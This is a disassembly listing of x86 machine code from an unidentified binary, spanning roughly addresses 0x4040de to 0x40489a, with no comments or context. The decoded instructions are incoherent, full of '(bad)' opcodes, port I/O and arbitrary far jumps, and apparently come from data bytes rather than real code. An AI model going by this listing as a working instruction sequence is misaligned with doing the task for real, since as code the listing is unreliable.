  4040de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040df:	popa   
  4040e0:	or     al,0x97
  4040e2:	in     eax,0xfa
  4040e4:	cld    
  4040e5:	add    eax,0x489c4ac5
  4040ea:	push   cs
  4040eb:	xchg   ecx,eax
  4040ec:	pop    edi
  4040ed:	cmp    DWORD PTR [edi],0xffffffa2
  4040f0:	les    ebp,FWORD PTR [esi+0x44fb979d]
  4040f6:	inc    ebx
  4040f7:	dec    esi
  4040f8:	loope  0x4040c0
  4040fa:	std    
  4040fb:	fcmovu st,st(7)
  4040fd:	jg     0x40414a
  4040ff:	mov    ds:0xab32c40b,al
  404104:	les    edi,FWORD PTR ds:0x397f444e
  40410a:	fcomi  st,st(5)
  40410c:	enter  0xbacc,0xa2
  404110:	scas   eax,DWORD PTR es:[edi]
  404111:	ja     0x40409a
  404113:	cmp    dh,BYTE PTR [edi]
  404115:	retf   0xab0a
  404118:	xchg   edx,eax
  404119:	xchg   edi,eax
  40411a:	stc    
  40411b:	in     al,0x9c
  40411d:	or     ecx,DWORD PTR [edi]
  40411f:	inc    eax
  404120:	inc    eax
  404121:	pminub mm6,QWORD PTR [edi-0x3a227125]
  404128:	xor    edx,DWORD PTR [edi-0x5b]
  40412b:	xchg   edi,eax
  40412c:	out    dx,al
  40412d:	shl    BYTE PTR [eax],cl
  40412f:	lahf   
  404130:	fcom   DWORD PTR [edx+0x366295d3]
  404136:	ja     0x404115
  404138:	adc    BYTE PTR [edi-0x7091f70b],dh
  40413e:	retf   
  40413f:	clc    
  404140:	ret    
  404141:	mov    bl,0xe
  404143:	mov    al,ds:0x87dada00
  404148:	loope  0x404169
  40414a:	mov    ebx,ebp
  40414c:	xor    DWORD PTR [esi+0xcedf6e7],0xf3c04826
  404156:	retf   0x6c5f
  404159:	xchg   ebp,eax
  40415a:	push   ebx
  40415b:	loop   0x4041d8
  40415d:	in     eax,0x33
  40415f:	daa    
  404160:	push   edi
  404161:	cmp    al,BYTE PTR [esi-0xd]
  404164:	test   DWORD PTR [ebx+0x72ab8cb3],ebx
  40416a:	popf   
  40416b:	aas    
  40416c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40416d:	push   esp
  40416e:	mov    dh,0xd
  404170:	mov    al,BYTE PTR [edi-0x386223ca]
  404176:	push   eax
  404177:	clc    
  404178:	and    DWORD PTR [edi],ebp
  40417a:	cdq    
  40417b:	jle    0x4041ad
  40417d:	cmp    ebp,DWORD PTR [eax]
  40417f:	sbb    BYTE PTR [edi+0xa648aa9],dh
  404185:	in     al,0xd
  404187:	mov    dh,0x1d
  404189:	fcom   QWORD PTR [ecx+0x5ce1516b]
  40418f:	mov    ebx,0x96ae242
  404194:	int3   
  404195:	jb     0x404162
  404197:	or     al,0x29
  404199:	test   eax,0xa2109e59
  40419e:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  4041a0:	push   eax
  4041a1:	dec    eax
  4041a2:	lods   al,BYTE PTR ds:[esi]
  4041a3:	push   0x384d6be5
  4041a8:	imul   ecx,DWORD PTR [ebx+esi*2],0x40
  4041ac:	bound  esi,QWORD PTR ds:0x9092f529
  4041b2:	mov    edi,0x7cdfe321
  4041b7:	xor    esi,0xf383bf37
  4041bd:	outs   dx,DWORD PTR ds:[esi]
  4041be:	enter  0xbed4,0xe3
  4041c2:	inc    ecx
  4041c3:	repz (bad) 
  4041c6:	out    dx,eax
  4041c7:	(bad)  
  4041c8:	fwait
  4041c9:	mov    BYTE PTR [eax+0x51],ch
  4041cc:	retf   0xe18f
  4041cf:	int    0x8b
  4041d1:	sub    bl,bh
  4041d3:	lahf   
  4041d4:	inc    esp
  4041d5:	xchg   esi,eax
  4041d6:	mov    ebx,0x583792b9
  4041db:	push   eax
  4041dc:	scas   al,BYTE PTR es:[edi]
  4041dd:	xor    ah,dl
  4041df:	dec    ebx
  4041e0:	into   
  4041e1:	js     0x404193
  4041e3:	and    dh,0xa0
  4041e6:	pushf  
  4041e7:	push   0x6a
  4041e9:	fs shl BYTE PTR es:0x33e9b629,0xab
  4041f2:	lock in al,dx
  4041f4:	or     ebp,DWORD PTR [edx]
  4041f6:	(bad)  
  4041f7:	jmp    FWORD PTR [eax+0x719358bb]
  4041fd:	xchg   esi,eax
  4041fe:	outs   dx,BYTE PTR ds:[esi]
  4041ff:	xchg   esp,eax
  404200:	jmp    0x4a7:0x8e5367bd
  404207:	and    eax,0x672fa3ac
  40420c:	or     eax,0x88109990
  404211:	or     edx,ebp
  404213:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404214:	mov    edi,0x4a0130d4
  404219:	scas   eax,DWORD PTR es:[edi]
  40421a:	adc    ch,BYTE PTR [eax+0x62b06f33]
  404220:	bound  eax,QWORD PTR [ecx]
  404222:	inc    esi
  404223:	sbb    BYTE PTR [ebp+0x6d92411d],bh
  404229:	jmp    0x1538:0x2ca76874
  404230:	mov    dh,0x55
  404232:	aad    0x17
  404234:	not    BYTE PTR [edi-0x20]
  404237:	dec    esp
  404238:	xor    DWORD PTR [edx-0x35f5242e],0xca6dc33d
  404242:	ja     0x404224
  404244:	jbe    0x4041cd
  404246:	push   cs
  404247:	push   edx
  404248:	mov    eax,0xb53997ae
  40424d:	and    DWORD PTR [edi],esp
  40424f:	push   eax
  404250:	pop    ss
  404251:	jb     0x4041d7
  404253:	adc    bl,dl
  404255:	lods   al,BYTE PTR ds:[esi]
  404256:	call   DWORD PTR fs:[esi-0x55]
  40425a:	dec    ebx
  40425b:	cmp    BYTE PTR [esi-0x64],0x92
  40425f:	ins    BYTE PTR es:[edi],dx
  404260:	pop    ss
  404261:	xchg   esi,eax
  404262:	cwde   
  404263:	xchg   edi,eax
  404264:	mov    bh,0x87
  404266:	hlt    
  404267:	mov    esi,0x9af24ccd
  40426c:	inc    edi
  40426d:	imul   ebp,DWORD PTR [eax],0x9d976572
  404273:	xchg   DWORD PTR [edx-0xb30edfb],ecx
  404279:	adc    BYTE PTR [eax],ch
  40427b:	in     al,dx
  40427c:	or     ah,ch
  40427e:	aaa    
  40427f:	mov    esi,0xde2f2b09
  404284:	or     ebp,DWORD PTR [esi]
  404286:	sbb    eax,0x2c6d7e71
  40428b:	xor    DWORD PTR ss:[bx+0x7e19],esi
  404291:	int3   
  404292:	loope  0x40423f
  404294:	pop    ecx
  404295:	shl    DWORD PTR [eax],cl
  404297:	leave  
  404298:	xor    al,0x40
  40429a:	fimul  WORD PTR [ebx-0x36c612ea]
  4042a0:	inc    ebp
  4042a1:	call   0xe4e4:0xdcb5913
  4042a8:	mov    bl,0xe9
  4042aa:	scas   eax,DWORD PTR es:[edi]
  4042ab:	inc    esp
  4042ac:	inc    ebx
  4042ad:	xor    BYTE PTR [ecx],ah
  4042af:	pushf  
  4042b0:	dec    ebx
  4042b1:	mov    dl,0x29
  4042b3:	shl    BYTE PTR [ebx-0xcc4773f],0xef
  4042ba:	or     bh,BYTE PTR [eax-0x5baa8ff7]
  4042c0:	les    edx,FWORD PTR [ebp-0x660a7fc]
  4042c6:	xchg   edx,eax
  4042c7:	pop    edi
  4042c8:	rcr    BYTE PTR [edx+eiz*8+0x30d18acc],1
  4042cf:	aad    0x7c
  4042d1:	test   BYTE PTR [edi+eiz*2-0x74],dh
  4042d5:	cmc    
  4042d6:	je     0x404288
  4042d8:	sub    DWORD PTR [edx+0x74],edx
  4042db:	jb     0x4042fb
  4042dd:	mov    ds:0xa4a7e999,al
  4042e2:	call   0xa3d4:0x7d327e15
  4042e9:	retf   0x7ab7
  4042ec:	fld    QWORD PTR [esi+0x15]
  4042ef:	mov    esi,DWORD PTR [esp+edx*2]
  4042f2:	das    
  4042f3:	pop    ds
  4042f4:	out    0xa5,eax
  4042f6:	cmp    DWORD PTR [edx],esi
  4042f8:	fs mov dl,0xeb
  4042fb:	fiadd  WORD PTR [ecx+eiz*8-0x48]
  4042ff:	lds    ecx,FWORD PTR [edx+ecx*1]
  404302:	sahf   
  404303:	mov    edi,gs
  404305:	pop    ebp
  404306:	sub    BYTE PTR [ebx-0x7fc4181a],ch
  40430c:	dec    esi
  40430d:	bound  esp,QWORD PTR [ebp+0x639b33bc]
  404313:	push   ss
  404314:	jns    0x40435a
  404316:	call   0x92f0a556
  40431b:	lods   al,BYTE PTR ds:[esi]
  40431c:	inc    esp
  40431d:	xchg   ebp,eax
  40431e:	fdivr  DWORD PTR [edi+0x401169ef]
  404324:	push   esp
  404325:	cwde   
  404326:	mov    bh,cl
  404328:	ins    DWORD PTR es:[edi],dx
  404329:	add    ebx,DWORD PTR [esi+0x5a]
  40432c:	outs   dx,BYTE PTR ds:[esi]
  40432d:	lods   eax,DWORD PTR ds:[esi]
  40432e:	and    BYTE PTR [edx+0x1d8e34cc],al
  404334:	or     esp,0x789ec0b7
  40433a:	icebp  
  40433b:	sti    
  40433c:	fs iret 
  40433e:	sub    DWORD PTR [edi-0x76d6a0b9],ebp
  404344:	xchg   esi,eax
  404345:	add    cl,al
  404347:	pop    ecx
  404348:	jge    0x4043af
  40434a:	sub    edi,ebp
  40434c:	fild   QWORD PTR [ebx+ebx*4+0x3787ba29]
  404353:	cmp    ah,BYTE PTR [ebp+0x7c2c0915]
  404359:	or     ch,al
  40435b:	js     0x40437e
  40435d:	pop    ebp
  40435e:	aas    
  40435f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404360:	inc    edi
  404361:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404362:	cmp    edi,DWORD PTR [ebx]
  404364:	or     BYTE PTR [ecx+0x3a],dh
  404367:	inc    ebp
  404368:	xchg   bp,ax
  40436a:	cmp    eax,DWORD PTR [esi-0x6d]
  40436d:	sti    
  40436e:	xor    BYTE PTR ds:[ebx],ah
  404371:	jp     0x404327
  404373:	add    eax,0x33995b29
  404378:	dec    ebp
  404379:	mov    eax,ds:0x30710df7
  40437e:	cmp    eax,ebp
  404380:	jl     0x4043a9
  404382:	sub    BYTE PTR [ebp+0x2d0f652d],ch
  404388:	mov    DWORD PTR [edx],esi
  40438a:	adc    eax,0x5cd2099
  40438f:	xchg   edi,eax
  404390:	mov    dl,0xa2
  404392:	das    
  404393:	aad    0xfa
  404395:	les    edx,FWORD PTR [ebx]
  404397:	mov    ds:0xdd2b6df2,eax
  40439c:	adc    DWORD PTR [ebp-0x6b8f83b1],esi
  4043a2:	lods   eax,DWORD PTR ds:[esi]
  4043a3:	daa    
  4043a4:	in     al,dx
  4043a5:	sub    dl,BYTE PTR [edx-0x1fecfe11]
  4043ab:	jecxz  0x4043c2
  4043ad:	push   edi
  4043ae:	adc    DWORD PTR [edi],ecx
  4043b0:	(bad)  
  4043b1:	stos   DWORD PTR es:[edi],eax
  4043b2:	daa    
  4043b3:	stc    
  4043b4:	jmp    0x225bd0e1
  4043b9:	push   ebx
  4043ba:	inc    esi
  4043bb:	pop    ebp
  4043bc:	cmp    edx,esp
  4043be:	or     DWORD PTR [edi-0x1757a75b],edi
  4043c4:	jns    0x4043e8
  4043c6:	pop    ebx
  4043c7:	mov    esi,0xd535f7c5
  4043cc:	(bad)  
  4043cd:	mov    dl,0xd1
  4043cf:	mov    al,ds:0x54fa199a
  4043d4:	ins    BYTE PTR es:[edi],dx
  4043d5:	call   0xcf9a:0x76381c9b
  4043dc:	fucom  st(5)
  4043de:	cmp    BYTE PTR [ebx-0x63],ah
  4043e1:	push   edi
  4043e2:	pop    ebx
  4043e3:	ret    
  4043e4:	imul   esp,DWORD PTR [eax],0x86d7428a
  4043ea:	pop    ecx
  4043eb:	lods   al,BYTE PTR ds:[esi]
  4043ec:	pop    ss
  4043ed:	or     BYTE PTR [eax+0x1],0x84
  4043f1:	enter  0x37a,0x1b
  4043f5:	xchg   ebp,eax
  4043f6:	push   edx
  4043f7:	mov    al,0xec
  4043fa:	pop    esp
  4043fb:	(bad)  
  4043fc:	pop    esi
  4043fd:	out    dx,eax
  4043fe:	or     ecx,DWORD PTR [edi+0x60]
  404401:	lds    esi,FWORD PTR [ebx-0x7fa7db8a]
  404407:	mov    dl,0x1a
  404409:	pusha  
  40440a:	inc    ebp
  40440b:	inc    ebx
  40440c:	fmul   st(5),st
  40440e:	ds lahf 
  404410:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404411:	outs   dx,DWORD PTR ds:[esi]
  404412:	scas   al,BYTE PTR es:[edi]
  404413:	and    BYTE PTR [ecx],cl
  404415:	shl    ch,1
  404417:	xchg   BYTE PTR [edx+ebp*1+0x280451e9],bl
  40441e:	jmp    0xb55b:0x64945f8a
  404425:	shl    DWORD PTR ds:0x22160ed0,cl
  40442b:	js     0x4043c5
  40442d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40442e:	neg    DWORD PTR [edx+edi*4+0x27]
  404432:	in     eax,0xae
  404434:	cmp    ch,BYTE PTR [ebx]
  404436:	and    DWORD PTR [edx+0x22],0xffffffb4
  40443a:	add    al,0x5a
  40443c:	xor    al,0x4b
  40443e:	out    dx,al
  40443f:	cs mov ch,0x46
  404442:	inc    eax
  404443:	lods   eax,DWORD PTR ds:[esi]
  404444:	xchg   esp,eax
  404445:	inc    edx
  404446:	cld    
  404447:	adc    eax,0x3545257
  40444c:	shl    esi,1
  40444e:	sub    al,0xd3
  404450:	pop    es
  404451:	in     al,0xa
  404453:	jp     0x404474
  404455:	outs   dx,BYTE PTR ds:[esi]
  404456:	daa    
  404457:	or     BYTE PTR [edi],cl
  404459:	jb     0x404463
  40445b:	imul   esp,DWORD PTR [esi-0x36],0x72
  40445f:	fisttp QWORD PTR [eax-0x6c0cb825]
  404465:	mov    dl,0xd
  404467:	mov    ah,0x2
  404469:	inc    ecx
  40446a:	nop
  40446b:	mov    dl,0x21
  40446d:	rcl    esi,0xfb
  404470:	xchg   edx,eax
  404471:	aas    
  404472:	add    al,0x44
  404474:	push   esi
  404475:	jbe    0x404433
  404477:	(bad)  
  404478:	pop    esi
  404479:	xchg   BYTE PTR [edx-0x52],bl
  40447c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40447d:	sub    al,0x26
  40447f:	lds    edx,FWORD PTR [ebx+0xa0d3761]
  404485:	mov    ah,bh
  404487:	mov    ds:0x674dcb55,al
  40448c:	nop
  40448d:	nop
  40448e:	xor    al,0xe9
  404490:	adc    bh,al
  404492:	call   0x50fd:0x613950f8
  404499:	dec    esi
  40449a:	fwait
  40449b:	pop    eax
  40449c:	inc    ecx
  40449d:	lds    ebp,FWORD PTR [edx]
  40449f:	dec    edi
  4044a0:	call   0x4292:0x6487c691
  4044a7:	cmp    DWORD PTR [eax],edx
  4044a9:	mov    edx,0x968d5c24
  4044ae:	mov    al,0xd2
  4044b0:	inc    ecx
  4044b1:	adc    BYTE PTR [esi+0x6260cc7e],ch
  4044b7:	and    DWORD PTR [ebp+edi*8-0x2a],ecx
  4044bb:	out    dx,eax
  4044bc:	gs mov ah,0x6f
  4044bf:	jl     0x40448a
  4044c1:	fimul  WORD PTR [ebp+0x20]
  4044c4:	lods   al,BYTE PTR ds:[esi]
  4044c5:	ja     0x40450c
  4044c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044c8:	sbb    al,BYTE PTR [ebx-0x70]
  4044cb:	push   cs
  4044cc:	push   ecx
  4044cd:	pushf  
  4044ce:	or     DWORD PTR [ebx-0x7921a730],ebp
  4044d4:	mov    ebp,0x65fda314
  4044d9:	rol    al,0xa4
  4044dc:	sub    eax,DWORD PTR [eax]
  4044de:	mov    ch,0xd5
  4044e0:	repnz ss sub al,ah
  4044e4:	dec    ecx
  4044e5:	and    eax,DWORD PTR [eax*2-0x4acb83f9]
  4044ec:	or     al,ch
  4044ee:	inc    edx
  4044ef:	and    DWORD PTR ds:0xf4a46e2,edi
  4044f5:	repnz inc ebx
  4044f7:	pop    esi
  4044f8:	sahf   
  4044f9:	imul   edi,DWORD PTR [ebx],0x6a5bfac7
  4044ff:	into   
  404500:	stc    
  404501:	lds    edx,FWORD PTR [ecx+0x4e481bef]
  404507:	(bad)  
  404508:	mov    cl,0x27
  40450a:	push   ds
  40450b:	sti    
  40450c:	xor    ebp,DWORD PTR [esi+edi*2]
  40450f:	mov    dl,0xfd
  404511:	out    dx,eax
  404512:	sti    
  404513:	ss stos BYTE PTR es:[di],al
  404516:	push   ds
  404517:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404518:	push   cs
  404519:	mov    edi,0xce58582b
  40451e:	enter  0x66fa,0x83
  404522:	add    esp,0xfffffff7
  404525:	fld    st(5)
  404527:	or     ebx,DWORD PTR [ecx*8-0x6717c432]
  40452e:	cmp    al,0x86
  404530:	aam    0x5b
  404532:	fwait
  404533:	(bad)  
  404534:	aad    0x2d
  404536:	mov    cl,0xb1
  404538:	repnz mov dh,0x24
  40453b:	(bad)  
  40453c:	push   ebx
  40453d:	cdq    
  40453e:	aas    
  40453f:	in     al,0xd7
  404541:	shl    DWORD PTR [esi],1
  404543:	imul   edx,DWORD PTR [esi+0x1d],0x70
  404547:	neg    bl
  404549:	arpl   WORD PTR [bx+di-0x23],bp
  40454d:	dec    esp
  40454e:	xchg   esi,eax
  40454f:	cs mov eax,0x8dea0c4
  404555:	stos   BYTE PTR es:[edi],al
  404556:	mov    al,ds:0xac68a5c5
  40455b:	sbb    DWORD PTR [ecx],ebp
  40455d:	xchg   ecx,eax
  40455e:	fld    DWORD PTR [eax-0xac8f3dd]
  404564:	test   eax,0xa23f240f
  404569:	es jecxz 0x404533
  40456c:	mov    ah,0x46
  40456e:	sub    al,0xdf
  404570:	pop    edi
  404571:	fmul   QWORD PTR [ebx]
  404573:	push   ebp
  404574:	lahf   
  404575:	inc    edi
  404576:	inc    ecx
  404577:	call   0x8592:0xb823e356
  40457e:	fstp   DWORD PTR [esi+ebx*8]
  404581:	pop    edi
  404582:	fsubr  QWORD PTR [ecx-0x672c475e]
  404588:	cmc    
  404589:	inc    eax
  40458a:	mov    ebx,0xf0c8439f
  40458f:	addr16 call 0x6174:0xe4877c6f
  404597:	lods   al,BYTE PTR ds:[esi]
  404598:	dec    ebx
  404599:	jmp    DWORD PTR [edx]
  40459b:	ds mov esp,0xb71ee48b
  4045a1:	cli    
  4045a2:	sub    DWORD PTR [ecx],esi
  4045a4:	mov    al,ds:0x13f9ce85
  4045a9:	sub    BYTE PTR [ebx-0x72],0xb8
  4045ad:	mov    al,0x30
  4045af:	jle    0x404615
  4045b1:	or     dl,bh
  4045b3:	retf   0x1490
  4045b6:	scas   al,BYTE PTR es:[edi]
  4045b7:	mov    ecx,0x294e3c51
  4045bc:	and    bh,BYTE PTR [eax+edx*1-0x2a72d422]
  4045c3:	into   
  4045c4:	add    dh,BYTE PTR ds:0x9e1c7e3c
  4045ca:	adc    al,0x78
  4045cc:	adc    eax,0xf13f6b05
  4045d1:	fs xchg esi,eax
  4045d3:	outs   dx,BYTE PTR ds:[esi]
  4045d4:	out    dx,eax
  4045d5:	mov    al,ds:0x64767b48
  4045da:	cmp    ecx,DWORD PTR [esi+0x68dc65d7]
  4045e0:	dec    ecx
  4045e1:	dec    ecx
  4045e2:	inc    eax
  4045e3:	bound  eax,QWORD PTR [esi-0x12878a94]
  4045e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045ea:	xchg   ebx,eax
  4045eb:	ins    BYTE PTR es:[edi],dx
  4045ec:	sub    al,BYTE PTR [eax-0x3ea2230d]
  4045f2:	push   0xfffffff2
  4045f4:	rcl    BYTE PTR [edx+0x43],0x2a
  4045f8:	in     eax,dx
  4045f9:	test   ebp,esi
  4045fb:	stos   DWORD PTR es:[edi],eax
  4045fc:	push   eax
  4045fd:	test   BYTE PTR [edi+0x3370996a],al
  404603:	js     0x404609
  404605:	retf   0x1216
  404608:	inc    edi
  404609:	dec    ebp
  40460a:	dec    ebx
  40460b:	sbb    al,0x4b
  40460d:	loope  0x40467d
  40460f:	sbb    dh,BYTE PTR [ecx+0x29]
  404612:	int3   
  404613:	in     al,0xf1
  404615:	xor    ch,BYTE PTR [ecx]
  404617:	outs   dx,DWORD PTR ds:[esi]
  404618:	inc    eax
  404619:	jmp    0x4045ce
  40461b:	es ja  0x40469d
  40461e:	push   esi
  40461f:	mov    eax,0xfce3bc35
  404624:	inc    esp
  404625:	(bad)  
  404626:	xor    eax,0xa301e11d
  40462b:	dec    ebp
  40462c:	repnz mov ebx,0x1722f4f0
  404632:	das    
  404633:	jnp    0x40467c
  404635:	mov    BYTE PTR [edx+0x2f],bl
  404638:	inc    ebp
  404639:	dec    esi
  40463a:	ins    DWORD PTR es:[edi],dx
  40463b:	outs   dx,DWORD PTR ds:[esi]
  40463c:	jno    0x4045cd
  40463e:	aas    
  40463f:	mul    DWORD PTR [ebx]
  404641:	loopne 0x40469a
  404643:	add    al,0xba
  404645:	call   edi
  404647:	fwait
  404648:	mov    bl,0xa1
  40464a:	jns    0x404687
  40464c:	(bad)  
  40464d:	jecxz  0x40467c
  40464f:	addr16 jle 0x40469e
  404652:	mov    eax,0x9902a81f
  404657:	cmp    DWORD PTR [ecx-0x15af5ddb],eax
  40465d:	inc    ebp
  40465e:	xor    ah,BYTE PTR [ebp+0x6c7290f1]
  404664:	sti    
  404665:	(bad)  
  404666:	sub    al,0x6d
  404668:	fistp  WORD PTR [ecx+0x6f3e4cdb]
  40466e:	js     0x40465b
  404670:	aad    0x45
  404672:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404673:	sar    ecx,1
  404675:	adc    DWORD PTR [esi-0x8],esp
  404678:	test   al,0xc0
  40467a:	imul   esi,DWORD PTR [ebp-0x57],0xffffff97
  40467e:	add    BYTE PTR [ecx],bl
  404680:	jmp    0xdff1:0x6a58ff72
  404687:	xor    eax,0xc449353d
  40468c:	xor    ebx,DWORD PTR [ecx]
  40468e:	mov    ah,BYTE PTR [edx]
  404690:	jne    0x404704
  404692:	iret   
  404693:	mov    ds:0x9395f7ef,eax
  404698:	fcom   QWORD PTR [edx-0x27de2b55]
  40469e:	fs pusha 
  4046a0:	sbb    ch,BYTE PTR [esi]
  4046a2:	jmp    0x404713
  4046a4:	mov    ?,edx
  4046a6:	scas   eax,DWORD PTR es:[edi]
  4046a7:	add    al,BYTE PTR [ebp+0x29]
  4046aa:	and    esp,DWORD PTR [esi+0x3a]
  4046ad:	mul    DWORD PTR [esi]
  4046af:	(bad)  
  4046b0:	int    0x4a
  4046b2:	imul   esi,DWORD PTR [esi+0x72f0641c],0xffffffa8
  4046b9:	test   DWORD PTR [ebx+0x3a1e4fe1],edi
  4046bf:	sahf   
  4046c0:	ds jo  0x404711
  4046c3:	inc    edx
  4046c4:	arpl   WORD PTR [esi],bp
  4046c6:	aaa    
  4046c7:	cmp    ah,bh
  4046c9:	arpl   WORD PTR [ecx],dx
  4046cb:	xchg   esp,eax
  4046cc:	retf   
  4046cd:	fs out dx,al
  4046cf:	shl    BYTE PTR [edi-0x443fc974],1
  4046d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046d6:	in     eax,dx
  4046d7:	test   al,0x86
  4046d9:	jno    0x40470e
  4046db:	or     ah,bh
  4046dd:	shr    BYTE PTR [eax],1
  4046df:	adc    ch,BYTE PTR [ebp+0x2f0a8438]
  4046e5:	xchg   ecx,eax
  4046e6:	stos   DWORD PTR es:[edi],eax
  4046e7:	sbb    eax,0xffb28327
  4046ec:	stc    
  4046ed:	inc    ebp
  4046ee:	push   di
  4046f0:	in     eax,dx
  4046f1:	in     eax,0xd1
  4046f3:	int3   
  4046f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046f5:	cs fsub st(3),st
  4046f8:	aaa    
  4046f9:	ss mov ah,0xf8
  4046fc:	jg     0x4046d8
  4046fe:	loope  0x404723
  404700:	pop    esp
  404701:	addr16 mov esp,0x51ed26a8
  404707:	xchg   BYTE PTR [edi-0x7b2c966b],ah
  40470d:	nop
  40470e:	push   eax
  40470f:	push   cs
  404710:	mov    BYTE PTR [ecx],0x40
  404713:	push   ss
  404714:	inc    esp
  404715:	mov    DWORD PTR [ebp-0x7d],ecx
  404718:	fist   WORD PTR [esi+ecx*4]
  40471b:	iret   
  40471c:	pop    ecx
  40471d:	lods   eax,DWORD PTR ds:[esi]
  40471e:	imul   ebx,DWORD PTR [esi],0x52229996
  404724:	xchg   ebp,eax
  404725:	xchg   ebp,eax
  404726:	sub    DWORD PTR [ecx-0x51],edi
  404729:	jae    0x40478f
  40472b:	sbb    al,0x3d
  40472d:	(bad)  
  40472e:	push   ds
  40472f:	adc    eax,0x691c65a8
  404734:	cs pop esi
  404736:	repz pop edi
  404738:	xor    DWORD PTR [edx],0x9c32e888
  40473e:	loop   0x404797
  404740:	sbb    eax,0x2dee0d58
  404745:	sbb    eax,0xf58ce241
  40474a:	xor    DWORD PTR [ebx-0x13],0xfdfbb1d7
  404751:	in     eax,dx
  404752:	(bad)  
  404753:	loop   0x404701
  404755:	inc    esi
  404756:	mov    eax,0xdb96d2fe
  40475b:	xchg   esi,eax
  40475c:	aas    
  40475d:	push   es
  40475e:	sbb    ch,BYTE PTR [eax+ebp*1-0x65cc7255]
  404765:	push   0x1e
  404767:	stc    
  404768:	popa   
  404769:	fdiv   DWORD PTR [eax-0xf]
  40476c:	add    al,0xe0
  40476e:	stos   DWORD PTR es:[edi],eax
  40476f:	(bad)  
  404770:	leave  
  404771:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404772:	sbb    BYTE PTR [esi-0x3a],bl
  404775:	lahf   
  404776:	xor    ah,BYTE PTR [esi]
  404778:	shl    DWORD PTR [eax+0x26],1
  40477b:	(bad)  
  40477c:	or     edx,DWORD PTR [eax]
  40477e:	(bad)  
  40477f:	mov    edi,0x536079a
  404784:	jo     0x4047a9
  404786:	mov    esi,0x616f5f5f
  40478b:	outs   dx,DWORD PTR ds:[esi]
  40478c:	dec    edx
  40478d:	mov    ds:0xccfdcd19,eax
  404792:	imul   edi,DWORD PTR [edx-0x23],0xc4aeef2c
  404799:	ror    BYTE PTR [edx+eiz*8],1
  40479c:	icebp  
  40479d:	mov    eax,ds:0xc22ce069
  4047a2:	cmp    al,BYTE PTR [eax+edx*4-0x55]
  4047a6:	mov    bh,BYTE PTR [ebx-0x5]
  4047a9:	add    dh,dl
  4047ab:	mov    edx,0xaf2dd6dc
  4047b0:	out    dx,eax
  4047b1:	out    dx,al
  4047b2:	not    BYTE PTR [esi+0x32]
  4047b5:	jp     0x40477d
  4047b7:	iret   
  4047b8:	enter  0xc68c,0xb4
  4047bc:	xor    eax,0x772922e0
  4047c1:	retf   
  4047c2:	inc    edx
  4047c3:	mov    ds:0xb30054ac,eax
  4047c8:	dec    edi
  4047c9:	or     al,0x98
  4047cb:	addr16 (bad) 
  4047cd:	push   eax
  4047ce:	sub    edx,DWORD PTR [ebp-0x1]
  4047d1:	mov    bl,dh
  4047d3:	or     eax,0x7a056996
  4047d8:	pop    edi
  4047d9:	mov    ebp,0xeed860e5
  4047de:	pop    es
  4047df:	mov    eax,ds:0xfcc334f2
  4047e4:	inc    ebp
  4047e5:	(bad)  
  4047e6:	push   ecx
  4047e7:	(bad)  
  4047e8:	cmp    dh,bh
  4047ea:	mov    esi,0x13865364
  4047ef:	inc    eax
  4047f0:	jb     0x404833
  4047f2:	das    
  4047f3:	fcmove st,st(4)
  4047f5:	aad    0x3c
  4047f7:	lds    edx,FWORD PTR [ecx+0x7a5aec65]
  4047fd:	lods   al,BYTE PTR ds:[esi]
  4047fe:	enter  0x265b,0x14
  404802:	push   0x5d
  404804:	mov    ah,0x41
  404806:	push   ebx
  404807:	mov    ecx,0x29b682ca
  40480c:	in     eax,dx
  40480d:	pop    esp
  40480e:	add    al,0x3
  404810:	lods   eax,DWORD PTR ds:[esi]
  404811:	xchg   esi,eax
  404812:	jae    0x4047ad
  404814:	fistp  WORD PTR [ecx+0x549cada8]
  40481a:	xchg   DWORD PTR ds:[ebp+edi*1+0x14],ebx
  40481f:	mov    bl,0xb4
  404821:	ins    BYTE PTR es:[edi],dx
  404822:	outs   dx,DWORD PTR ds:[esi]
  404823:	mov    ds:0x44eec103,al
  404828:	and    eax,0x240a4063
  40482d:	mov    al,0xc5
  40482f:	test   eax,0xf2021be
  404834:	dec    ebp
  404835:	pop    edx
  404836:	cmp    al,0xc4
  404838:	test   eax,0x3b8301d7
  40483d:	jnp    0x40485b
  40483f:	test   DWORD PTR [ebp+esi*1+0x78769192],esi
  404846:	push   ebp
  404847:	sub    eax,0xc6b9b12c
  40484c:	mov    esi,0xffbbb69b
  404851:	aaa    
  404852:	xor    BYTE PTR [edi-0x3af5a114],0x8d
  404859:	rcl    BYTE PTR [eax-0x4a6249e9],0xd6
  404860:	push   ss
  404861:	sbb    al,0xaf
  404863:	mov    ?,WORD PTR [ebx+0x621d1d32]
  404869:	cmp    eax,0xc0fbdcaa
  40486e:	xchg   esp,eax
  40486f:	adc    DWORD PTR [ebx],ecx
  404871:	push   esi
  404872:	adc    eax,0x277cfd0
  404877:	pop    ds
  404878:	or     BYTE PTR [ebp+0x30],cl
  40487b:	pop    ecx
  40487c:	sub    ebx,esi
  40487e:	ja     0x40488b
  404880:	push   ss
  404881:	popa   
  404882:	dec    esi
  404883:	mov    cl,0x54
  404885:	and    DWORD PTR [ebx],ebp
  404887:	shl    DWORD PTR [esi-0x64],cl
  40488a:	inc    edi
  40488b:	imul   edi,DWORD PTR [eax+0x66],0xffffff87
  40488f:	mov    dh,0x6
  404891:	hlt    
  404892:	out    dx,eax
  404893:	iret   
  404894:	icebp  
  404895:	inc    eax
  404896:	fisubr WORD PTR [edx]
  404898:	in     eax,dx
  404899:	icebp  
  40489a:	xchg   ebp,eax
